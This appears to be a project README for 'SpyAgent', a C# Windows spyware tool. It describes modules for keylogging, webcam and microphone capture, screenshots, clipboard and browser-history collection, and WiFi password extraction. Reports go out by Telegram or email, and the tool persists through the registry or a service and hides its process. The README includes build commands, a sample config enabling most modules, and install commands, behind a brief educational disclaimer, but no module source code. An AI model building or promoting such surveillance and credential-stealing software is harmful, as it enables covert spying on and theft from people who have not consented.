# Windows Spyware | Keylogger + Webcam + Screenshots + Clipboard | C#

![Build](https://img.shields.io/badge/build-passing-brightgreen)
![.NET](https://img.shields.io/badge/.NET-9.0-blue)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-green)
![Modules](https://img.shields.io/badge/modules-8-orange)

## Overview

SpyAgent is a modular surveillance framework for Windows featuring keylogging, screen capture, webcam recording, clipboard monitoring, browser history collection, microphone recording, WiFi password extraction, and active window tracking. Reports are delivered via email or Telegram.

## Features

- **Keylogger** — Low-level keyboard hook with window title context
- **Screen Capture** — Periodic screenshots at configurable intervals
- **Webcam Recorder** — Snapshot capture from connected cameras
- **Clipboard Watcher** — Real-time clipboard change monitoring
- **Browser History** — Chrome/Firefox/Edge history collection
- **Microphone Recorder** — Audio capture to WAV format
- **WiFi Passwords** — Saved network credential extraction
- **Active Window Tracker** — Application usage timeline
- **Email Reporting** — SMTP delivery with attachments
- **Telegram Reporting** — Bot API file delivery
- **Service Persistence** — Windows service installation
- **Registry Autostart** — HKCU Run key persistence
- **Process Hiding** — Self-rename and attribute manipulation
- **Module Scheduler** — Configurable execution intervals

## Project Structure

```
src/SpyAgent/
├── Program.cs
├── Core/
│   ├── SpyEngine.cs
│   ├── ModuleScheduler.cs
│   └── DataAggregator.cs
├── Modules/
│   ├── KeyLogger.cs
│   ├── ScreenCapture.cs
│   ├── WebcamRecorder.cs
│   ├── ClipboardWatcher.cs
│   ├── BrowserHistoryCollector.cs
│   ├── MicrophoneRecorder.cs
│   ├── WifiPasswordGrabber.cs
│   └── ActiveWindowTracker.cs
├── Reporting/
│   ├── EmailReporter.cs
│   └── TelegramReporter.cs
├── Persistence/
│   ├── ServiceInstaller.cs
│   └── RegistryAutostart.cs
├── Stealth/
│   └── ProcessHider.cs
├── Models/
│   └── KeystrokeLog.cs
├── Config/
│   └── SpyConfig.cs
└── Utils/
    └── NativeHooks.cs
```

## Build Instructions

### Prerequisites

- .NET 9.0 SDK
- Windows 10/11
- Visual Studio 2022+ or `dotnet` CLI

### Build

```bash
dotnet restore
dotnet build --configuration Release
```

### Publish (single file, trimmed)

```bash
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:PublishTrimmed=true
```

## Usage

### Configuration

```json
{
  "ReportingMethod": "telegram",
  "TelegramBotToken": "YOUR_TOKEN",
  "TelegramChatId": "YOUR_CHAT_ID",
  "SmtpServer": "smtp.gmail.com",
  "SmtpPort": 587,
  "EmailTo": "reports@example.com",
  "Modules": {
    "Keylogger": { "Enabled": true, "Interval": 300 },
    "ScreenCapture": { "Enabled": true, "Interval": 60 },
    "Webcam": { "Enabled": false, "Interval": 600 },
    "Clipboard": { "Enabled": true, "Interval": 30 },
    "BrowserHistory": { "Enabled": true, "Interval": 3600 },
    "Microphone": { "Enabled": false, "Duration": 30 },
    "WifiPasswords": { "Enabled": true, "Interval": 86400 },
    "ActiveWindow": { "Enabled": true, "Interval": 5 }
  },
  "ReportInterval": 3600,
  "Persistence": "registry"
}
```

### Command Line

```bash
SpyAgent.exe --config config.json
SpyAgent.exe --install-service
SpyAgent.exe --uninstall
```

## Disclaimer

**This project is strictly for educational and authorized security research.** SpyAgent demonstrates surveillance software architecture for academic study in controlled lab environments. Deploying monitoring software on systems without the owner's explicit consent is illegal in most jurisdictions. The authors accept no responsibility for unauthorized use.
